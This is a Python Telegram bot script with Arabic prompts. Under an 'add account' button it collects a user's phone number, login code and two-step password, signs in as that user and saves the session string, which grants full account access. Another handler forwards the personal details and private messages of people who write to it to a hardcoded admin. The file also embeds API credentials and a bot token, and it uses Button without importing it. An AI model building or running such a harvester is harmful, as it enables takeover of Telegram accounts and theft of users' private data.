import os
from telethon.tl import functions
from telethon.sessions import StringSession
import asyncio, json, shutil
from kvsqlite.sync import Client as uu
from telethon import TelegramClient, events
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)

if not os.path.isdir('database'):
    os.mkdir('database')

API_ID = "21669021"
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
admin = 7072622935
token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"
client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
bot = client

# Create Database
db = uu('database/elhakem.ss', 'bot')

if not db.exists("account"):
    db.set("account", {})

def main_buttons(account_exists):
    buttons = [[Button.inline("➕ إضافة حساب", data="add")]]
    return buttons

@client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
async def start(event):
    account = db.get("account")
    account_exists = bool(account)
    await event.reply(
        "👋 أهلاً بك! يمكنك اختيار أحد الخيارات أدناه.",
        buttons=main_buttons(account_exists)
    )

@client.on(events.callbackquery.CallbackQuery())
async def callback_handler(event):
    data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
    user_id = event.chat_id
    account = db.get("account")
    account_exists = bool(account)

    if data == "add":
        if account_exists:
            await event.edit("⚠️ يمكنك إضافة حساب واحد فقط.", buttons=main_buttons(account_exists))
            return
        async with bot.conversation(user_id) as x:
            await x.send_message("✔️الان ارسل رقمك مع رمز دولتك , مثال :+201000000000")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")
            
            app = TelegramClient(StringSession(), API_ID, API_HASH)
            await app.connect()
            try:
                await app.send_code_request(phone_number)
            except (ApiIdInvalidError, PhoneNumberInvalidError):
                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                return

            await x.send_message("- تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
            txt = await x.get_response()
            code = txt.text.replace(" ", "")
            try:
                await app.sign_in(phone_number, code)
                string_session = app.session.save()
                db.set("account", {"phone_number": phone_number, "session": string_session})
                await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=main_buttons(True))
            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=main_buttons(account_exists))
            except SessionPasswordNeededError:
                await x.send_message("- أرسل رمز التحقق بخطوتين الخاص بحسابك")
                txt = await x.get_response()
                password = txt.text
                try:
                    await app.sign_in(password=password)
                    string_session = app.session.save()
                    db.set("account", {"phone_number": phone_number, "session": string_session})
                    await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=main_buttons(True))
                except PasswordHashInvalidError:
                    await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=main_buttons(account_exists))
            finally:
                await app.disconnect()

@client.on(events.NewMessage)
async def message_logger(event):
    account = db.get("account")
    if account:
        # التحقق من أن الرسالة ليست من البوت نفسه أو من المستخدمين الآخرين
        if event.is_private and event.chat_id != admin:
            sender = await event.get_sender()
            sender_info = {
                "ID": sender.id,
                "اسم المستخدم": sender.username,
                "الاسم": sender.first_name,
                "رقم الهاتف": sender.phone,
                "الرسالة": event.message.message,
                "تاريخ الإرسال": event.message.date
            }
            # إرسال المعلومات إلى المسؤول
            await bot.send_message(admin, f"📝 تم استقبال رسالة جديدة:\n{json.dumps(sender_info, ensure_ascii=False, indent=2)}")

client.run_until_disconnected()
